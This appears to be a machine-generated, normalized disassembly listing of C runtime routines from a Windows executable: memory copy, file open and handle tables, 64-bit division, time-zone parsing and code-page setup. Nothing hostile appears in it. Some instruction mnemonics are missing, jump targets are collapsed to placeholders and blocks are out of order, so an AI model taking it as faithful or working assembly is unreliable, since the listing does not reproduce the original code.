pop edi
leave
retn
jmp [ ecx * 4 + jump_table_409ca0 ]
and eax 0x3
sub ecx eax
jmp [ eax * 4 + jump_table_409ba8 ]
neg ecx
jmp [ ecx * 4 + r-xdata ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409ca0 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b08 ]
[ edi ] [ esi ]
jmp [ edx * 4 + jump_table_409b08 ]
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
mov [ edi + 0x1 ] al
mov eax [ ebp + 0x8 ]
pop esi
pop edi
leave
retn
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
dec esi
shr ecx 0x2
dec edi
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
shr ecx 0x2
mov [ edi + 0x2 ] al
sub esi 0x2
sub edi 0x2
cmp ecx 0x8
jb r-xdata
mov al [ esi + 0x3 ]
and edx ecx
mov [ edi + 0x3 ] al
mov al [ esi + 0x2 ]
mov [ edi + 0x2 ] al
mov al [ esi + 0x1 ]
shr ecx 0x2
mov [ edi + 0x1 ] al
sub esi 0x3
sub edi 0x3
cmp ecx 0x8
jb r-xdata
mov eax [ esi + ecx * 4 + 0x1c ]
mov [ edi + ecx * 4 + 0x1c ] eax
mov eax [ esi + ecx * 4 + 0x18 ]
mov [ edi + ecx * 4 + 0x18 ] eax
mov eax [ esi + ecx * 4 + 0x14 ]
mov [ edi + ecx * 4 + 0x14 ] eax
mov eax [ esi + ecx * 4 + 0x10 ]
mov [ edi + ecx * 4 + 0x10 ] eax
mov eax [ esi + ecx * 4 + 0xc ]
mov [ edi + ecx * 4 + 0xc ] eax
mov eax [ esi + ecx * 4 + 0x8 ]
mov [ edi + ecx * 4 + 0x8 ] eax
mov eax [ esi + ecx * 4 + 0x4 ]
mov [ edi + ecx * 4 + 0x4 ] eax
lea eax [ ecx * 4 ]
add esi eax
add edi eax
jmp [ edx * 4 + jump_table_409ca0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409ca0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409ca0 ]
std
[ edi ] [ esi ]
cld
jmp [ edx * 4 + jump_table_409ca0 ]
sub_409d0c
inc [ rw-data ]
push 0x1000
call sub_4054cb
pop ecx
mov ecx [ esp + 0x4 ]
test eax eax
mov [ ecx + 0x8 ] eax
je r-xdata
or [ ecx + 0xc ] 0x4
lea eax [ ecx + 0x14 ]
mov [ ecx + 0x8 ] eax
mov [ ecx + 0x18 ] 0x2
or [ ecx + 0xc ] 0x8
mov [ ecx + 0x18 ] 0x1000
jmp r-xdata
mov eax [ ecx + 0x8 ]
and [ ecx + 0x4 ] 0x0
mov [ ecx ] eax
retn
sub_409d76
mov eax [ rw-data ]
push esi
push 0x14
test eax eax
pop esi
jne r-xdata
cmp eax esi
jge r-xdata
mov eax 0x200
jmp r-xdata
push 0x4
push eax
call sub_40b290
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov eax esi
mov [ rw-data ] eax
xor ecx ecx
mov eax rw-data
push 0x4
push esi
mov [ rw-data ] esi
call sub_40b290
pop ecx
mov [ rw-data ] eax
test eax eax
pop ecx
jne r-xdata
mov edx [ rw-data ]
mov [ ecx + edx ] eax
add eax 0x20
add ecx 0x4
cmp eax rw-data
jl r-xdata
xor edx edx
mov ecx rw-data
push 0x1a
call sub_406534
pop ecx
or [ ecx ] 0xffffffff
test eax eax
jne r-xdata
mov eax edx
mov esi edx
sar eax 0x5
and esi 0x1f
mov eax [ eax * 4 + rw-data ]
mov eax [ eax + esi * 8 ]
cmp eax 0xffffffff
je r-xdata
pop esi
retn
add ecx 0x20
inc edx
cmp ecx rw-data
jl r-xdata
sub_409e2f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
test eax eax
jne r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
pop ebp
retn
lea ecx [ ebp + 0x8 ]
and [ ebp + 0x8 ] 0x0
push ecx
push 0x0
push [ rw-data ]
push eax
lea eax [ ebp + 0xc ]
push 0x1
push eax
push 0x220
push [ rw-data ]
call [ WideCharToMultiByte@IAT ]
test eax eax
je r-xdata
mov cx [ ebp + 0xc ]
cmp cx 0xff
ja r-xdata
mov [ rw-data ] 0x2a
or eax 0xffffffff
cmp [ ebp + 0x8 ] 0x0
je r-xdata
push 0x1
mov [ eax ] cl
pop eax
pop ebp
retn
pop ebp
retn
sub_409ea0
push ebx
push esi
mov eax [ esp + 0x18 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x14 ]
mov edx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
mov ecx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
xor edx edx
div ecx
mov ebx eax
mov eax [ esp + 0xc ]
div ecx
mov edx ebx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov esi eax
mul [ esp + 0x18 ]
mov ecx eax
mov eax [ esp + 0x14 ]
mul esi
add edx ecx
jb r-xdata
pop esi
pop ebx
retn 0x10
dec esi
cmp edx [ esp + 0x10 ]
ja r-xdata
jb r-xdata
xor edx edx
mov eax esi
cmp eax [ esp + 0xc ]
jbe r-xdata
sub_409f10
push ebx
mov eax [ esp + 0x14 ]
or eax eax
jne r-xdata
mov ecx eax
mov ebx [ esp + 0x10 ]
mov edx [ esp + 0xc ]
mov eax [ esp + 0x8 ]
mov ecx [ esp + 0x10 ]
mov eax [ esp + 0xc ]
xor edx edx
div ecx
mov eax [ esp + 0x8 ]
div ecx
mov eax edx
xor edx edx
jmp r-xdata
shr ecx 0x1
rcr ebx 0x1
shr edx 0x1
rcr eax 0x1
or ecx ecx
jne r-xdata
div ebx
mov ecx eax
mul [ esp + 0x14 ]
xchg ecx eax
mul [ esp + 0x10 ]
add edx ecx
jb r-xdata
pop ebx
retn 0x10
sub eax [ esp + 0x10 ]
sbb edx [ esp + 0x14 ]
cmp edx [ esp + 0xc ]
ja r-xdata
jb r-xdata
sub eax [ esp + 0x8 ]
sbb edx [ esp + 0xc ]
neg edx
neg eax
sbb edx 0x0
cmp eax [ esp + 0x8 ]
jbe r-xdata
sub_409f85
mov ecx [ esp + 0x4 ]
xor edx edx
mov [ rw-data ] ecx
mov eax rw-data
mov eax [ edx * 8 + rw-data ]
mov [ rw-data ] eax
retn
add eax 0x8
inc edx
cmp eax rw-data
jl r-xdata
cmp ecx [ eax ]
je r-xdata
cmp ecx 0x13
jb r-xdata
cmp ecx 0xbc
jb r-xdata
cmp ecx 0x24
ja r-xdata
mov [ rw-data ] 0x16
cmp ecx 0xca
mov [ rw-data ] 0x8
jbe r-xdata
mov [ rw-data ] 0xd
retn
retn
sub_409fec
push ebx
push esi
push edi
or ebx 0xffffffff
xor edi edi
xor esi esi
mov ecx rw-data
mov esi 0x100
push esi
call sub_4054cb
test eax eax
pop ecx
je r-xdata
lea edx [ eax + 0x100 ]
pop edi
mov eax ebx
pop esi
pop ebx
retn
add [ rw-data ] 0x20
lea ecx [ edi * 4 + rw-data ]
lea edx [ eax + 0x100 ]
mov [ ecx ] eax
add ecx 0x4
inc edi
add esi 0x20
cmp ecx rw-data
jl r-xdata
test [ eax + 0x4 ] 0x1
je r-xdata
shl edi 0x5
mov ebx edi
and [ eax + 0x4 ] 0x0
or [ eax ] 0xffffffff
mov [ eax + 0x5 ] 0xa
mov edx [ ecx ]
add eax 0x8
add edx esi
jmp r-xdata
mov eax [ ecx ]
test eax eax
je r-xdata
jmp r-xdata
or [ eax ] 0xffffffff
sub eax [ ecx ]
sar eax 0x3
add eax esi
mov ebx eax
cmp ebx 0xffffffff
jne r-xdata
add eax 0x8
jmp r-xdata
cmp eax edx
jae r-xdata
cmp eax edx
jae r-xdata
sub_40a081
mov eax [ esp + 0x4 ]
push esi
cmp eax [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov esi eax
sar ecx 0x5
and esi 0x1f
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
cmp [ ecx + esi ] 0xffffffff
jne r-xdata
cmp [ rw-data ] 0x1
push ebx
mov ebx [ esp + 0x14 ]
jne r-xdata
mov eax [ edi ]
mov [ eax + esi ] ebx
xor eax eax
pop ebx
jmp r-xdata
sub eax 0x0
je r-xdata
pop edi
pop esi
retn
push ebx
push 0xfffffff6
dec eax
je r-xdata
push ebx
push 0xfffffff5
jmp r-xdata
dec eax
jne r-xdata
call [ SetStdHandle@IAT ]
push ebx
push 0xfffffff4
jmp r-xdata
sub_40a0f8
mov ecx [ esp + 0x4 ]
push esi
cmp ecx [ rw-data ]
push edi
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
mov eax ecx
mov esi ecx
sar eax 0x5
and esi 0x1f
lea edi [ eax * 4 + rw-data ]
shl esi 0x3
mov eax [ edi ]
add eax esi
test [ eax + 0x4 ] 0x1
je r-xdata
cmp [ eax ] 0xffffffff
je r-xdata
cmp [ rw-data ] 0x1
jne r-xdata
mov eax [ edi ]
or [ eax + esi ] 0xffffffff
xor eax eax
jmp r-xdata
xor eax eax
sub ecx eax
je r-xdata
pop edi
pop esi
retn
push eax
push 0xfffffff6
dec ecx
je r-xdata
push eax
push 0xfffffff5
jmp r-xdata
dec ecx
jne r-xdata
call [ SetStdHandle@IAT ]
push eax
push 0xfffffff4
jmp r-xdata
sub_40a172
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x9
or eax 0xffffffff
retn
mov ecx eax
and eax 0x1f
sar ecx 0x5
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + eax * 8 + 0x4 ] 0x1
lea eax [ ecx + eax * 8 ]
je r-xdata
mov eax [ eax ]
retn
sub_40a1af
mov eax [ esp + 0x4 ]
cmp eax [ rw-data ]
jae r-xdata
mov [ rw-data ] 0x9
or eax 0xffffffff
mov ecx eax
mov edx eax
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
test [ ecx + edx * 8 + 0x4 ] 0x1
je r-xdata
push eax
call sub_40a172
pop ecx
push eax
call [ FlushFileBuffers@IAT ]
test eax eax
jne r-xdata
xor eax eax
call [ GetLastError@IAT ]
jmp r-xdata
retn
mov [ rw-data ] eax
test eax eax
je r-xdata
sub_40a206
push ebp
mov ebp esp
sub esp 0x1c
mov ecx [ ebp + 0xc ]
push ebx
xor ebx ebx
push esi
test cl 0x80
push edi
mov [ ebp - 0x1c ] 0xc
mov [ ebp - 0x18 ] ebx
je r-xdata
and [ ebp - 0x1 ] 0x0
mov [ ebp - 0x14 ] 0x1
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push 0x3
mov eax ecx
pop esi
and eax esi
sub eax ebx
je r-xdata
test ch 0x40
jne r-xdata
mov eax 0x8000
test eax ecx
jne r-xdata
mov [ ebp - 0xc ] 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ rw-data ] eax
je r-xdata
mov [ ebp - 0x10 ] ebx
cmp eax 0x20
je r-xdata
mov [ ebp - 0xc ] 0x40000000
jmp r-xdata
dec eax
je r-xdata
cmp ecx 0x500
je r-xdata
je r-xdata
mov [ ebp - 0x10 ] 0x1
jmp r-xdata
cmp eax 0x30
je r-xdata
mov eax [ ebp + 0x10 ]
cmp eax 0x10
je r-xdata
mov [ ebp - 0xc ] 0xc0000000
jmp r-xdata
mov [ rw-data ] 0x16
mov [ rw-data ] ebx
jmp r-xdata
mov [ ebp - 0x8 ] 0x1
cmp ecx 0x600
je r-xdata
mov [ ebp - 0x8 ] esi
jmp r-xdata
cmp ecx ebx
je r-xdata
mov edx 0x700
mov eax 0x400
and ecx edx
mov edi 0x100
cmp ecx eax
jg r-xdata
mov [ ebp - 0x10 ] 0x2
jmp r-xdata
cmp eax 0x40
jne r-xdata
or eax 0xffffffff
jmp r-xdata
test al 0x40
je r-xdata
mov ecx [ rw-data ]
not ecx
and ecx [ ebp + 0x14 ]
test cl 0x80
jne r-xdata
mov [ ebp - 0x8 ] 0x5
jmp r-xdata
cmp ecx edx
je r-xdata
mov eax [ ebp + 0xc ]
mov esi 0x80
test edi eax
je r-xdata
cmp ecx edi
je r-xdata
mov [ ebp - 0x10 ] esi
jmp r-xdata
pop edi
pop esi
pop ebx
leave
retn
test ah 0x10
je r-xdata
or esi 0x4000000
or [ ebp - 0xa ] 0x1
push 0x1
pop esi
jmp r-xdata
mov [ ebp - 0x8 ] 0x4
jmp r-xdata
cmp ecx 0x200
je r-xdata
test al 0x20
je r-xdata
or esi edi
cmp ecx 0x300
jne r-xdata
test al 0x10
je r-xdata
or esi 0x8000000
jmp r-xdata
mov [ ebp - 0x8 ] 0x2
jmp r-xdata
call sub_409fec
mov ebx eax
or edi 0xffffffff
cmp ebx edi
jne r-xdata
or esi 0x10000000
push 0x0
push esi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x1c ]
push eax
push [ ebp - 0x10 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileA@IAT ]
mov esi eax
cmp esi edi
je r-xdata
and [ rw-data ] 0x0
mov [ rw-data ] 0x18
jmp r-xdata
call [ GetLastError@IAT ]
push eax
call sub_409f85
pop ecx
push esi
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov eax edi
jmp r-xdata
cmp eax 0x2
jne r-xdata
push esi
call [ CloseHandle@IAT ]
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
push esi
push ebx
call sub_40a081
pop ecx
mov al [ ebp - 0x1 ]
pop ecx
mov esi ebx
mov ecx ebx
or al 0x1
sar ecx 0x5
and esi 0x1f
mov [ ebp + 0xb ] al
lea edi [ ecx * 4 + rw-data ]
shl esi 0x3
mov ecx [ edi ]
and [ ebp + 0xb ] 0x48
mov [ ecx + esi + 0x4 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
cmp [ ebp + 0xb ] 0x0
jne r-xdata
test al 0x80
je r-xdata
mov eax ebx
test [ ebp + 0xc ] 0x8
je r-xdata
test [ ebp + 0xc ] 0x2
je r-xdata
mov eax [ edi ]
or [ eax + esi + 0x4 ] 0x20
lea eax [ eax + esi + 0x4 ]
push 0x2
push 0xffffffff
push ebx
call sub_408b3a
add esp 0xc
cmp eax 0xffffffff
mov [ ebp - 0x10 ] eax
jne r-xdata
and [ ebp + 0x13 ] 0x0
lea eax [ ebp + 0x13 ]
push 0x1
push eax
push ebx
call sub_408944
add esp 0xc
test eax eax
jne r-xdata
cmp [ rw-data ] 0x83
je r-xdata
push 0x0
push 0x0
push ebx
call sub_408b3a
add esp 0xc
cmp eax 0xffffffff
jne r-xdata
cmp [ ebp + 0x13 ] 0x1a
jne r-xdata
jmp r-xdata
push ebx
call sub_40832d
pop ecx
push [ ebp - 0x10 ]
push ebx
call sub_40b36e
pop ecx
cmp eax 0xffffffff
pop ecx
je r-xdata
sub_40a4d4
push ecx
push ebx
push ebp
push esi
push edi
xor ebp ebp
or ebx 0xffffffff
push r--data
xor edi edi
mov [ rw-data ] ebp
mov [ rw-data ] ebx
mov [ rw-data ] ebx
call sub_40b4b4
mov esi eax
pop ecx
cmp esi ebp
jne r-xdata
cmp [ esi ] 0x0
je r-xdata
push rw-data
call [ GetTimeZoneInformation@IAT ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
mov eax [ rw-data ]
mov ecx [ rw-data ]
imul eax eax 0x3c
cmp [ rw-data ] bp
push 0x1
pop edx
mov [ rw-data ] eax
mov [ rw-data ] edx
je r-xdata
push [ rw-data ]
call sub_405f9f
push esi
call sub_405450
inc eax
push eax
call sub_4054cb
add esp 0xc
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
push eax
push esi
call sub_405690
pop ecx
test eax eax
pop ecx
je r-xdata
cmp [ rw-data ] bp
je r-xdata
mov esi ecx
imul esi esi 0x3c
add eax esi
mov [ rw-data ] eax
push esi
push eax
call sub_405540
push 0x3
push esi
push [ rw-data ]
call sub_40b020
mov eax [ rw-data ]
add esi 0x3
add esp 0x14
and [ eax + 0x3 ] 0x0
cmp [ esi ] 0x2d
jne r-xdata
mov [ rw-data ] ebp
mov [ rw-data ] ebp
mov eax [ rw-data ]
cmp eax ebp
je r-xdata
push esi
call sub_405ccb
pop ecx
mov bl 0x30
mov ecx eax
imul ecx ecx 0xe10
mov [ rw-data ] ecx
push 0x1
inc esi
pop edi
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
sub eax ecx
mov [ rw-data ] edx
imul eax eax 0x3c
mov [ rw-data ] eax
jmp r-xdata
inc esi
jmp r-xdata
cmp al bl
jl r-xdata
mov eax [ rw-data ]
and [ eax ] 0x0
cmp [ esp + 0x10 ] ebp
jne r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
mov esi [ WideCharToMultiByte@IAT ]
push eax
push ebp
push 0x3f
mov edi 0x220
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
mov al [ esi ]
cmp al 0x2b
je r-xdata
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
mov eax [ rw-data ]
and [ eax + 0x3f ] 0x0
jmp r-xdata
lea eax [ esp + 0x10 ]
push eax
push ebp
push 0x3f
push [ rw-data ]
push ebx
push rw-data
push edi
push [ rw-data ]
call esi
test eax eax
je r-xdata
cmp edi ebp
je r-xdata
inc esi
push esi
call sub_405ccb
imul eax eax 0x3c
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
movsx eax [ esi ]
cmp eax ebp
mov [ rw-data ] eax
je r-xdata
neg ecx
mov [ rw-data ] ecx
cmp [ esi ] 0x3a
jne r-xdata
cmp al 0x39
jg r-xdata
push 0x3
push esi
push [ rw-data ]
call sub_40b020
mov eax [ rw-data ]
add esp 0xc
and [ eax + 0x3 ] 0x0
jmp r-xdata
inc esi
push esi
call sub_405ccb
pop ecx
mov ecx [ rw-data ]
add ecx eax
mov [ rw-data ] ecx
inc esi
jmp r-xdata
cmp al 0x39
jg r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
inc esi
jmp r-xdata
mov al [ esi ]
cmp al bl
jl r-xdata
sub_40a732
push ebx
push esi
push edi
xor edi edi
cmp [ rw-data ] edi
jne r-xdata
mov esi [ esp + 0x10 ]
push 0x1
pop ebx
mov eax [ esi + 0x14 ]
cmp eax [ rw-data ]
jne r-xdata
xor eax eax
jmp r-xdata
cmp [ rw-data ] edi
je r-xdata
cmp eax [ rw-data ]
je r-xdata
pop edi
pop esi
pop ebx
retn
push edi
push edi
push edi
push 0x2
push edi
push edi
push ebx
push 0x4
push eax
push ebx
push ebx
call sub_40a8de
push edi
push edi
push edi
push 0x2
push edi
push edi
push 0x5
push 0xa
push [ esi + 0x14 ]
push ebx
push edi
call sub_40a8de
add esp 0x58
movzx ecx [ rw-data ]
push ecx
cmp [ rw-data ] di
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
jne r-xdata
mov edx [ rw-data ]
mov eax [ rw-data ]
mov ecx [ esi + 0x1c ]
cmp edx eax
jge r-xdata
cmp ecx eax
jl r-xdata
cmp ecx edx
jl r-xdata
movzx ecx [ rw-data ]
push ecx
push edi
movzx ecx [ rw-data ]
push edi
push ecx
push eax
push edi
movzx ecx [ rw-data ]
push edi
push ecx
movzx ecx [ rw-data ]
push ecx
movzx ecx [ rw-data ]
push ecx
push eax
push ebx
jmp r-xdata
mov eax ebx
cmp ecx edx
jg r-xdata
cmp ecx eax
jg r-xdata
movzx eax [ rw-data ]
push eax
push edi
movzx eax [ rw-data ]
push edi
push eax
push [ esi + 0x14 ]
push edi
jmp r-xdata
movzx eax [ rw-data ]
push edi
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
push [ esi + 0x14 ]
push ebx
push ebx
call sub_40a8de
movzx eax [ rw-data ]
add esp 0x2c
cmp [ rw-data ] di
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
movzx eax [ rw-data ]
push eax
jne r-xdata
cmp ecx eax
jle r-xdata
cmp ecx edx
jle r-xdata
push edi
call sub_40a8de
add esp 0x2c
jmp r-xdata
mov eax [ esi + 0x8 ]
imul eax eax 0x3c
add eax [ esi + 0x4 ]
imul eax eax 0x3c
add eax [ esi ]
imul eax eax 0x3e8
cmp ecx edx
jne r-xdata
cmp ecx edx
jl r-xdata
cmp ecx eax
jge r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setl cl
jmp r-xdata
xor ecx ecx
cmp eax [ rw-data ]
setge cl
mov eax ecx
jmp r-xdata
sub_40a8de
push ebp
mov ebp esp
cmp [ ebp + 0xc ] 0x1
push ebx
mov ebx [ ebp + 0x10 ]
push esi
jne r-xdata
mov eax [ ebp + 0x14 ]
test bl 0x3
jne r-xdata
mov eax [ ebp + 0x14 ]
mov [ ebp + 0x10 ] ebx
and [ ebp + 0x10 ] 0x3
mov esi eax
jne r-xdata
mov ecx [ eax * 4 + rw-data ]
mov ecx [ eax * 4 + rw-data ]
jmp r-xdata
shl esi 0x2
mov eax [ esi + rw-data ]
shl esi 0x2
mov eax [ esi + rw-data ]
jmp r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
imul eax eax 0x3c
add eax [ rw-data ]
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jns r-xdata
mov eax [ ebp + 0x24 ]
mov [ rw-data ] ecx
imul eax eax 0x3c
add eax [ ebp + 0x28 ]
mov [ rw-data ] ebx
imul eax eax 0x3c
add eax [ ebp + 0x2c ]
imul eax eax 0x3e8
add eax [ ebp + 0x30 ]
mov [ rw-data ] eax
jmp r-xdata
add ecx [ ebp + 0x20 ]
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
add ecx eax
imul eax eax 0x7
sub eax edx
add eax [ ebp + 0x1c ]
lea ecx [ ecx + eax - 0x7 ]
jmp r-xdata
mov edx ebx
lea ecx [ eax + 0x1 ]
imul edx edx 0x16d
lea eax [ ebx - 0x1 ]
push edi
sar eax 0x2
mov edi ecx
push 0x7
add edi eax
lea eax [ edx + edi - 0x63db ]
pop edi
cdq
idiv edi
mov eax [ ebp + 0x18 ]
pop edi
cmp edx [ ebp + 0x1c ]
jge r-xdata
mov edx 0x5265c00
cmp eax edx
jl r-xdata
add eax 0x5265c00
dec ecx
mov [ rw-data ] eax
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
cmp [ ebp + 0x8 ] 0x1
jne r-xdata
cmp [ ebp + 0x10 ] 0x0
jne r-xdata
cmp [ ebp + 0x18 ] 0x5
jne r-xdata
mov [ rw-data ] ebx
sub eax edx
inc ecx
mov [ rw-data ] eax
mov [ rw-data ] ecx
mov esi [ esi + rw-data ]
mov esi [ esi + rw-data ]
jmp r-xdata
sub ecx 0x7
jmp r-xdata
cmp ecx esi
jle r-xdata
sub_40aa1e
push ebp
mov ebp esp
push 0xffffffff
push r--data
push r-xdata
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x18
push ebx
push esi
push edi
mov [ ebp - 0x18 ] esp
mov eax [ rw-data ]
xor ebx ebx
cmp eax ebx
jne r-xdata
cmp eax 0x2
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push 0x1
pop esi
push esi
push r--data
push esi
call [ GetStringTypeW@IAT ]
test eax eax
je r-xdata
cmp eax 0x1
jne r-xdata
mov eax [ ebp + 0x1c ]
cmp eax ebx
jne r-xdata
lea eax [ ebp - 0x1c ]
push eax
push esi
push r--data
push esi
push ebx
call [ GetStringTypeA@IAT ]
test eax eax
je r-xdata
mov eax esi
jmp r-xdata
xor eax eax
cmp [ ebp + 0x18 ] ebx
jne r-xdata
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call [ GetStringTypeA@IAT ]
jmp r-xdata
mov eax [ rw-data ]
push 0x2
pop eax
mov [ rw-data ] eax
push ebx
push ebx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
mov eax [ ebp + 0x20 ]
neg eax
sbb eax eax
and eax 0x8
inc eax
push eax
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
mov [ ebp - 0x20 ] eax
cmp eax ebx
je r-xdata
mov eax [ rw-data ]
mov [ ebp + 0x18 ] eax
lea esp [ ebp - 0x34 ]
mov ecx [ ebp - 0x10 ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
leave
retn
mov [ ebp - 0x4 ] ebx
lea edi [ eax + eax ]
mov eax edi
add eax 0x3
and al 0xfc
call sub_405f70
mov [ ebp - 0x18 ] esp
mov esi esp
mov [ ebp - 0x24 ] esi
push edi
push ebx
push esi
call sub_405a60
add esp 0xc
jmp r-xdata
or [ ebp - 0x4 ] 0xffffffff
cmp esi ebx
je r-xdata
push [ ebp - 0x20 ]
push esi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x18 ]
call [ MultiByteToWideChar@IAT ]
cmp eax ebx
je r-xdata
push [ ebp + 0x14 ]
push eax
push esi
push [ ebp + 0x8 ]
call [ GetStringTypeW@IAT ]
jmp r-xdata
sub_40ab78
movzx eax [ esp + 0x4 ]
mov cl [ esp + 0xc ]
test [ eax + rw-data ] cl
jne r-xdata
push 0x1
pop eax
retn
cmp [ esp + 0x8 ] 0x0
je r-xdata
xor eax eax
movzx eax [ eax * 2 + rw-data ]
and eax [ esp + 0x8 ]
jmp r-xdata
retn
test eax eax
jne r-xdata
sub_40aba9
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
push [ ebp + 0x8 ]
call sub_40ad42
mov esi eax
pop ecx
cmp esi [ rw-data ]
mov [ ebp + 0x8 ] esi
je r-xdata
xor eax eax
jmp r-xdata
xor ebx ebx
cmp esi ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_40adbf
xor edx edx
mov eax rw-data
push 0x40
xor eax eax
pop ecx
mov edi rw-data
[ edi ]
lea esi [ edx + edx * 2 ]
mov [ ebp - 0x4 ] ebx
shl esi 0x4
stosb [ edi ]
lea ebx [ esi + rw-data ]
add eax 0x30
inc edx
cmp eax rw-data
jl r-xdata
inc [ ebp - 0x4 ]
add ebx 0x8
cmp [ ebp - 0x4 ] 0x4
jb r-xdata
mov dl [ ecx + 0x1 ]
test dl dl
je r-xdata
cmp [ eax ] esi
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
push esi
call [ GetCPInfo@IAT ]
cmp eax 0x1
jne r-xdata
cmp [ ebx ] 0x0
mov ecx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
mov [ rw-data ] 0x1
push eax
mov [ rw-data ] eax
call sub_40ad8c
lea esi [ esi + rw-data ]
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop ecx
mov [ rw-data ] eax
movsd [ edi ] [ esi ]
jmp r-xdata
movzx eax [ ecx ]
movzx edi dl
cmp eax edi
ja r-xdata
cmp [ rw-data ] ebx
je r-xdata
push 0x40
xor eax eax
pop ecx
mov edi rw-data
cmp [ ebp - 0x18 ] 0x1
mov [ rw-data ] esi
[ edi ]
stosb [ edi ]
mov [ rw-data ] ebx
jbe r-xdata
call sub_40ade8
inc ecx
inc ecx
cmp [ ecx ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov dl [ edx + rw-data ]
or eax 0xffffffff
mov [ rw-data ] ebx
cmp [ ebp - 0x12 ] 0x0
je r-xdata
or [ eax + rw-data ] dl
inc eax
cmp eax edi
jbe r-xdata
push 0x1
pop eax
lea ecx [ ebp - 0x11 ]
or [ eax + rw-data ] 0x8
inc eax
cmp eax 0xff
jb r-xdata
push esi
call sub_40ad8c
pop ecx
mov [ rw-data ] eax
mov [ rw-data ] 0x1
jmp r-xdata
movzx eax [ ecx - 0x1 ]
movzx edx dl
xor eax eax
mov edi rw-data
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
jmp r-xdata
inc ecx
inc ecx
cmp [ ecx - 0x1 ] 0x0
jne r-xdata
or [ eax + rw-data ] 0x4
inc eax
jmp r-xdata
mov dl [ ecx ]
test dl dl
je r-xdata
cmp eax edx
ja r-xdata
sub_40ad42
mov eax [ esp + 0x4 ]
and [ rw-data ] 0x0
cmp eax 0xfffffffe
jne r-xdata
cmp eax 0xfffffffd
jne r-xdata
